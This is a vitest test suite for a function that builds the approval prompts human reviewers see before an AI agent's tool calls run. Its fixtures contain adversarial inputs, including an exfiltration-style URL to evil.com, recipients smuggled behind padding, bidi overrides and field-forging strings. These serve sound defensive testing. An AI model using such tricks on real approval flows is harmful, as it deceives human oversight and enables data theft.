import { describe, it, expect, beforeAll } from "vitest";
import {
  APPROVAL_TITLE_MAX,
  APPROVAL_DESCRIPTION_MAX,
  PROMPT_HOST_MAX,
} from "@/lib/approvals/prompt";
import { buildApprovalPrompt } from "@/test-helpers/approvals";
import { makeRefResolver } from "@/lib/approvals/call-models";
// pinchy-odoo's own encoder, so the ref below is a real one — see
// call-models.test.ts for why this crosses the package boundary.
import { encodeRef, _resetKeyCacheForTest } from "../../../../plugins/pinchy-odoo/integration-ref";

const REF_KEY = "c".repeat(64);
beforeAll(() => {
  process.env.PINCHY_REF_TOKEN_KEY = REF_KEY;
  _resetKeyCacheForTest();
});

/**
 * The text a person reads before they approve an action. It replaces the bare
 * tool name that shipped in #865 ("odoo_create requires confirmation"), which
 * names the function rather than the act — the reviewer could not tell what
 * would happen or to what.
 *
 * OpenClaw caps `title` at 80 characters and `description` at 256, and the
 * gateway REJECTS a request that exceeds them. So the caps are not style
 * advice here: exceeding one turns a confirmation into a failed tool call.
 */
/** The prompt for a call that gets one; fails the test for one that is refused. */
function promptFor(...args: Parameters<typeof buildApprovalPrompt>) {
  const built = buildApprovalPrompt(...args);
  if ("exceeded" in built) throw new Error(`refused: ${JSON.stringify(built.exceeded)}`);
  return built;
}

describe("buildApprovalPrompt", () => {
  it("names the action rather than the function", () => {
    const { title } = promptFor("pinchy_web_search", { query: "acme gmbh" });
    expect(title).toBe("Search the web");
    expect(title).not.toContain("pinchy_web_search");
  });

  it("puts the target in the description, so the reviewer sees what it acts on", () => {
    const { description } = promptFor("pinchy_web_search", {
      query: "acme gmbh",
    });
    expect(description).toContain("acme gmbh");
  });

  it("still says something usable for a tool the registry does not know", () => {
    // knowledge_search reaches an agent through the Knowledge Base template and
    // is in no registry — the same gap that made the confirmation list render
    // empty in #865. A prompt builder that returned nothing here would put an
    // unlabelled card in front of the user.
    const { title, description } = promptFor("knowledge_search", {
      query: "vacation policy",
    });
    expect(title.length).toBeGreaterThan(0);
    expect(title).toContain("knowledge_search");
    expect(description).toContain("vacation policy");
  });

  it("keeps both fields inside the gateway's hard caps", () => {
    const { title, description } = promptFor("pinchy_write", {
      path: "a/very/long/path/".repeat(40),
      content: "x".repeat(5000),
    });
    expect(title.length).toBeLessThanOrEqual(APPROVAL_TITLE_MAX);
    expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
  });

  it("truncates visibly rather than cutting a word mid-air", () => {
    const { description } = promptFor("pinchy_write", {
      content: "y".repeat(5000),
    });
    expect(description.endsWith("…")).toBe(true);
  });

  it("does not carry a secret-looking argument into the approval surface", () => {
    // The prompt is delivered to every connected approval surface, including
    // chat channels. summarizeArgs already redacts these for the card; the
    // same redaction has to hold here or the safer surface leaks what the
    // riskier one hides.
    const { description } = promptFor("pinchy_web_fetch", {
      url: "https://example.com",
      api_key: "sk-live-must-not-appear",
    });
    expect(description).not.toContain("sk-live-must-not-appear");
  });

  it("has no argument text at all when the call carries none", () => {
    const { description } = promptFor("pinchy_web_search", {});
    expect(description.length).toBeGreaterThan(0);
    expect(description).not.toContain("undefined");
    expect(description).not.toContain("{}");
  });

  // #1133. Once deletion can be gated per model, "Delete a record in Odoo" is
  // not a decision anyone can make — the whole point of the setting is that
  // an invoice and a note are different answers. The resources the gate
  // resolved are what the card has to show.
  it("names the resource the call acts on", () => {
    const { title } = promptFor("odoo_delete", { ids: [7] }, ["account.move"]);
    expect(title).toContain("account.move");
  });

  it("names every resource of a call that spans more than one", () => {
    const { title } = promptFor("odoo_reconcile", {}, ["account.move", "account.payment"]);
    expect(title).toContain("account.move");
    expect(title).toContain("account.payment");
  });

  it("says nothing about resources when the call names none", () => {
    const bare = promptFor("email_send", { to: "ada@example.com" });
    const empty = promptFor("email_send", { to: "ada@example.com" }, []);
    expect(empty.title).toBe(bare.title);
    expect(empty.title).not.toContain("—");
  });

  // A ref the model garbled resolves to `null`. Printing that would put the
  // word "null" on a security prompt; the honest rendering is to leave the
  // resource unstated and let the tool name carry the meaning.
  it("does not print an unnamed resource", () => {
    const { title } = promptFor("odoo_confirm_order", {}, [null]);
    expect(title.toLowerCase()).not.toContain("null");
  });

  it("keeps the title inside the cap even with many resources", () => {
    const { title } = promptFor(
      "odoo_write",
      {},
      Array.from({ length: 20 }, (_, i) => `a.very.long.model.name.number.${i}`)
    );
    expect(title.length).toBeLessThanOrEqual(APPROVAL_TITLE_MAX);
  });

  // An opaque ref is 200+ characters of base64 and says nothing to a human.
  // Left in the summary it also eats the entire 256-character description,
  // pushing out the arguments that carry the meaning.
  //
  // The input is a real ref, not a fake "pinchy_ref:v1:AAAA…" string: a fake one
  // only stayed out of the description while ANY string with that prefix was
  // hidden — the hole that let a prefixed email body vanish. A real ref is
  // replaced by the record it names; a fake one is text.
  it("does not fill the description with an opaque ref token", () => {
    const ref = encodeRef({
      integrationType: "odoo",
      connectionId: "c1",
      model: "sale.order",
      id: 9,
      label: "S00009",
    });
    const { description } = promptFor("odoo_confirm_order", { target: ref }, ["sale.order"], {
      refRecord: makeRefResolver(REF_KEY),
    });
    expect(description).not.toContain(ref.slice(20, 40));
    // Outside any quotes: quoted, the record read exactly like a string typed
    // with those characters.
    expect(description).toContain('target: (record reference: sale.order #9 "S00009")');
  });

  // A valid ref followed by `=` and text decoded to the record, so the prompt
  // named the record and dropped the text the tool would send.
  it("shows the text after a ref, not the record it seems to name", () => {
    const ref = encodeRef({
      integrationType: "odoo",
      connectionId: "c1",
      model: "res.partner",
      id: 7,
      label: "Raimund Korber",
    });
    const { description } = promptFor(
      "email_send",
      { to: "kunde@example.com", body: `${ref}=\n\nBitte überweisen Sie an AT00 1234` },
      [],
      { refRecord: makeRefResolver(REF_KEY) }
    );
    expect(description).not.toContain("record reference");
    expect(description).toContain(ref.slice(0, 40));
  });

  it("shows free text that starts with the ref prefix as the text it is", () => {
    const { description } = promptFor("email_send", {
      to: "boss@firma.at",
      subject: "pinchy_ref:v1: Neue Bankverbindung",
    });
    expect(description).toContain("pinchy_ref:v1: Neue Bankverbindung");
  });

  // Odoo reads bool("false") as True — on a security prompt the string and the
  // boolean must not print alike.
  it("tells a string that reads like a literal apart from the literal", () => {
    const { description } = promptFor("odoo_write", {
      values: { active: "false", is_company: false, x: null },
    });
    expect(description).toContain('active: "false"');
    expect(description).toContain("is_company: false");
    expect(description).toContain("x: null");
  });

  it("names the recipient's address before a padded display name", () => {
    const { description } = promptFor("email_send", {
      to: `Raimund Korber${"\u2800".repeat(190)} <attacker@evil.com>`,
      subject: "Rechnung",
    });
    expect(description).toContain('to: "attacker@evil.com" (name: "Raimund Korber');
  });
  // The prompt reaches chat surfaces too, and it reads the same summary as the
  // card. Once the summary keeps real arrays/objects, flattening them with
  // String() would print "[object Object]" on a security prompt.
  it("spells out nested arguments instead of printing [object Object]", () => {
    const { description } = promptFor("odoo_write", {
      ids: [7],
      values: { acc_number: "AT61 1904", amount: 99999 },
    });
    expect(description).not.toContain("[object Object]");
    expect(description).toContain('acc_number: "AT61 1904"');
    expect(description).toContain("99999");
  });

  it("lists every recipient, including one smuggled behind padding", () => {
    const { description } = promptFor("email_send", {
      to: `chef@firma.at${" ".repeat(300)}, angreifer@evil.com`,
    });
    expect(description).toContain("chef@firma.at");
    expect(description).toContain("angreifer@evil.com");
  });
  // A typed `⟨U+200D⟩` printed exactly like the marker for a real joiner.
  it.each([
    ["/data/a⟨U+200D⟩b.md", "/data/a‍b.md"],
    ["/data/x⟨U+00A0⟩y.md", "/data/x y.md"],
    ["/data/a⟨4 spaces⟩b.md", "/data/a    b.md"],
  ])("prints a typed marker %j apart from the character it names", (typed, real) => {
    const prompt = (path: string) => promptFor("pinchy_write", { path }).description;
    expect(prompt(typed)).not.toBe(prompt(real));
  });

  // The title names the model the call acts on, and that name comes from the
  // call too — it is rendered like every other value.
  it("renders the model in the title as the card does", () => {
    const { title } = promptFor("odoo_delete", {}, ["res.partner‮evil", "a⟨b"]);
    expect(title).toContain("res.partner⟨U+202E⟩evil");
    expect(title).toContain("a⟨U+27E8⟩b");
  });

  // A CRLF mail body printed "⟨U+000D⟩" before every line break on the chat
  // prompt, as on the card.
  it("renders a CRLF body as line breaks", () => {
    const { description } = promptFor("email_send", {
      to: "a@x.at",
      body: "Hallo,\r\nzweite Zeile\rx",
    });
    expect(description).toContain('body: "Hallo,\nzweite Zeile⟨U+000D⟩x"');
  });

  it("never cuts the description between the halves of an emoji", () => {
    for (let pad = 0; pad < 4; pad++) {
      const { description } = promptFor("email_send", {
        to: "a@x.at",
        body: `${"x".repeat(pad)}${"😀".repeat(300)}`,
      });
      expect(description).not.toMatch(
        /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/
      );
    }
  });

  // A chat client draws `/data/חוזים/2024.md` and `/data/2024/חוזים.md` alike, as
  // the card did. The prompt is plain text, so it carries the card's order in
  // Unicode's own controls: each line in an LTR isolate with an override (U+2066
  // U+202D … U+202C U+2069), each right-to-left word in an isolate of its own
  // (U+2066 … U+2069).
  it("holds the arguments in the order they were sent", () => {
    const shown = (path: string) => promptFor("pinchy_write", { path }).description;
    expect(shown("/data/חוזים/2024.md")).toContain(
      '\u2066\u202Dpath: "/data/\u2066חוזים\u2069/2024.md"\u202C\u2069'
    );
    expect(shown("/data/2024/חוזים.md")).toContain(
      '\u2066\u202Dpath: "/data/2024/\u2066חוזים\u2069.md"\u202C\u2069'
    );
  });

  // A line break ends an override, so every line of a body opens its own.
  it("holds every line of a multi-line value in order", () => {
    const { description } = promptFor("email_send", { body: "שלום 1\n2 עולם" });
    expect(description).toContain(
      '\u2066\u202Dbody: "\u2066שלום\u2069 1\u202C\u2069\n\u2066\u202D2 \u2066עולם\u2069"\u202C\u2069'
    );
  });

  // A dagesh with no letter under it, in front of a right-to-left word, drew
  // exactly like the dagesh on the word's last letter. The prompt is built from
  // the same escaping as the card.
  it("marks a combining mark that has no letter to sit on", () => {
    const shown = (path: string) => promptFor("pinchy_write", { path }).description;
    expect(shown("/data/\u05BCבא.md")).toContain("/data/⟨U+05BC⟩\u2066בא\u2069.md");
    expect(shown("/data/בא\u05BC.md")).toContain("/data/\u2066בא\u05BC\u2069.md");
  });

  // Printed bare, a string holding `, `, `: `, `{`, `}`, `[` or `]` would print
  // exactly like the structure it imitates — each pair below would be one
  // prompt. Every string is quoted, at every level, so a string can only ever
  // read as a string.
  it.each([
    [
      "a field smuggled into a string",
      { model: "res.partner", ids: [7], values: { name: "Acme", active: false } },
      { model: "res.partner", ids: [7], values: { name: "Acme, active: false" } },
    ],
    [
      "a second id smuggled into a string",
      { model: "res.partner", ids: [7, 8], values: { x: 1 } },
      { model: "res.partner", ids: ["7, 8"], values: { x: 1 } },
    ],
    [
      "a top-level argument smuggled into a path",
      { path: "/data/a.md", content: "hi" },
      { path: "/data/a.md, content: hi" },
    ],
  ])("prints %s apart from the real thing", (_label, real, forged) => {
    const prompt = (args: unknown) => promptFor("odoo_write", args).description;
    expect(prompt(forged)).not.toBe(prompt(real));
  });

  it("quotes every string, at every level", () => {
    const { description } = promptFor("odoo_write", {
      ids: ["7, 8"],
      values: { name: 'Acme "Ltd", \\x', active: false },
    });
    expect(description).toContain(
      'ids: ["7, 8"], values: {name: "Acme \\"Ltd\\", \\\\x", active: false}'
    );
  });

  // The rule the pairs above are instances of: two different calls never
  // share a prompt, whatever their strings hold.
  it("gives every different call its own description", () => {
    let seed = 1242;
    const random = () => {
      seed = (seed + 0x6d2b79f5) | 0;
      let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 2 ** 32;
    };
    const pick = <T>(items: T[]): T => items[Math.floor(random() * items.length)];
    // Pieces of the structure a string would have to imitate, so the fuzz
    // actually reaches forgeries rather than hoping to type one.
    const alphabet = ["a", "7", " ", ", ", ": ", "{", "}", "[", "]", '"', "\\", "b: ", "true"];
    const text = () =>
      Array.from({ length: Math.floor(random() * 6) }, () => pick(alphabet)).join("");
    const value = (depth: number): unknown => {
      const kind = Math.floor(random() * (depth > 1 ? 4 : 6));
      if (kind === 0) return text();
      if (kind === 1) return pick([0, 7, 8, true, false, null]);
      if (kind === 2 || kind === 3) return text();
      if (kind === 4)
        return Array.from({ length: Math.floor(random() * 3) }, () => value(depth + 1));
      return object(depth + 1);
    };
    const object = (depth: number) =>
      Object.fromEntries(["a", "b"].filter(() => random() < 0.6).map((key) => [key, value(depth)]));
    const seen = new Map<string, string>();
    let compared = 0;
    for (let n = 0; n < 20000; n++) {
      const args = object(0);
      const { description } = promptFor("odoo_write", args);
      if (description.endsWith("…")) continue;
      compared++;
      const call = JSON.stringify(args);
      const earlier = seen.get(description);
      if (earlier !== undefined && earlier !== call) {
        expect.fail(`${earlier} and ${call} both read ${JSON.stringify(description)}`);
      }
      seen.set(description, call);
    }
    expect(compared).toBeGreaterThan(15000);
  });

  // The description is cut at 256 characters, wherever that falls: inside a
  // long text before the address, or inside the address itself, past
  // `https://www.firma.at.` and before the domain it really reaches.
  describe("when the description has to be cut", () => {
    it("names every host the call reaches before the arguments", () => {
      const { description } = promptFor("odoo_write", {
        ids: [7],
        values: { comment: "x ".repeat(200), website: "https://evil.com/", email: "a@b.evil.org" },
      });
      expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
      expect(description).toContain(
        'Modify existing records in Odoo — reaches "evil.com", "b.evil.org" — ids: [7]'
      );
    });

    it("names a long host by its end, where the domain it reaches is", () => {
      const host = `www.firma.at.${"a".repeat(300)}.evil.com`;
      const { description } = promptFor("pinchy_web_fetch", { url: `https://${host}/x` });
      expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
      expect(description).toContain(`reaches "…${host.slice(-PROMPT_HOST_MAX)}" — url:`);
    });

    it("names each host once", () => {
      const hosts = Array.from({ length: 2 }, (_, i) => `${String(i).repeat(80)}.example`);
      const { description } = promptFor("email_send", {
        to: [hosts[0], ...hosts].map((host) => `x@${host}`),
      });
      expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
      expect(description.split(`"${hosts[0]}"`)).toHaveLength(2);
      expect(description).toMatch(
        /^Send email directly — reaches "0+\.example", "1+\.example" — to:/
      );
    });

    // Naming only the hosts that fit would leave out whichever came last —
    // and the order is the call's: decoys under `target` and `destination`
    // ahead of `url` would take the room, and the host the fetch reaches would
    // go unnamed. A prompt that cannot name every host is not offered at all.
    it("refuses a call whose hosts do not all fit, rather than leave one out", () => {
      const hosts = Array.from({ length: 6 }, (_, i) => `${String(i).repeat(60)}.example`);
      expect(buildApprovalPrompt("email_send", { to: hosts.map((host) => `x@${host}`) })).toEqual({
        exceeded: { kind: "too-many-hosts", count: 6 },
      });
    });

    it("names every host whatever order the arguments come in", () => {
      const params = {
        target: `https://${"a".repeat(80)}.firma.at/`,
        destination: "https://b.firma.at/",
        url: "https://evil.com/exfil?d=secret",
        note: "x ".repeat(100),
      };
      for (const order of [params, Object.fromEntries(Object.entries(params).reverse())]) {
        const { description } = promptFor("pinchy_web_fetch", order);
        expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
        for (const host of [`${"a".repeat(80)}.firma.at`, "b.firma.at", "evil.com"]) {
          expect(description).toContain(`"${host}"`);
        }
      }
    });

    // A label such as `xn--a` does not decode, so Node gives the domain no
    // resolved form — and the mail library sends to it, and a browser opens
    // it, as written. The domain at its end is still where it goes.
    it("names the end of a mail domain that is not a valid domain name", () => {
      const pad = [..."abc"].map((c) => c.repeat(63)).join(".");
      const domain = `firma.at.${pad}.${"d".repeat(30)}.xn--a.evil.com`;
      const { description } = promptFor("email_send", { to: `boss@${domain}` });
      expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
      expect(description).toContain(`reaches "…${domain.slice(-PROMPT_HOST_MAX)}" — to:`);
    });

    describe("names every host with a label that does not decode", () => {
      const pad = [..."abc"].map((c) => c.repeat(63)).join(".");
      const labels = ["xn--", "xn--a", "xn---", "xn--ab-cd", "XN--A", "Xn--a"];
      const shapes: [string, (host: string) => Record<string, unknown>][] = [
        ["a recipient", (host) => ({ to: `boss@${host}` })],
        ["a named recipient", (host) => ({ to: `Boss <boss@${host}>` })],
        ["a mailbox at any key", (host) => ({ values: { email: `boss@${host}` } })],
        ["a URL", (host) => ({ url: `https://${host}/x` })],
        ["a URL with userinfo and a port", (host) => ({ url: `https://u@${host}:8080/x` })],
        ["a URL without slashes", (host) => ({ url: `https:${host}/x` })],
        ["a URL with a tab in its path", (host) => ({ url: `https://${host}/x\ty` })],
        ["a URL with a space in its path", (host) => ({ url: `https://${host}/x y` })],
        [
          "a URL with a no-break space in its path",
          (host) => ({ url: `https://${host}/x\u00a0y` }),
        ],
        ["a URL with a tab in its scheme", (host) => ({ url: `ht\ttps://${host}/` })],
        ["a URL with words after it", (host) => ({ url: `https://${host}/ see above` })],
        [
          "a URL with a long user name in front",
          (host) => ({
            values: { website: `https://www.firma.at.${"a".repeat(250)}@${host}/\tx` },
          }),
        ],
      ];
      for (const label of labels) {
        it.each(shapes)(`%s, with the label ${JSON.stringify(label)}`, (_shape, call) => {
          for (const host of [`${label}.evil.com`, `firma.at.${pad}.${label}.evil.com`]) {
            const { description } = promptFor("pinchy_web_fetch", {
              note: "x ".repeat(100),
              ...call(host),
            });
            expect(description.length).toBeLessThanOrEqual(APPROVAL_DESCRIPTION_MAX);
            const reaches = /— reaches ("[^"]*"(?:, "[^"]*")*) — /.exec(description);
            expect(reaches?.[1]).toBe(
              `"${host.length > PROMPT_HOST_MAX ? "…" : ""}${host.toLowerCase().slice(-PROMPT_HOST_MAX)}"`
            );
          }
        });
      }
    });

    it("leaves a hidden secret's host unsaid", () => {
      const { description } = promptFor("odoo_write", {
        values: { comment: "x ".repeat(200), api_key: "https://secret.example/" },
      });
      expect(description).not.toContain("secret.example");
    });
  });

  it("adds no hosts to a description that fits", () => {
    const { description } = promptFor("pinchy_web_fetch", { url: "https://evil.com/x" });
    expect(description).toBe(
      'Download and read content from web pages — url: "https://evil.com/x"'
    );
  });

  it("adds no control characters to a call without right-to-left text", () => {
    const { description } = promptFor("pinchy_write", { path: "/data/2024/x.md" });
    expect(description).not.toMatch(/[\u2066-\u2069\u202A-\u202E]/);
  });
});
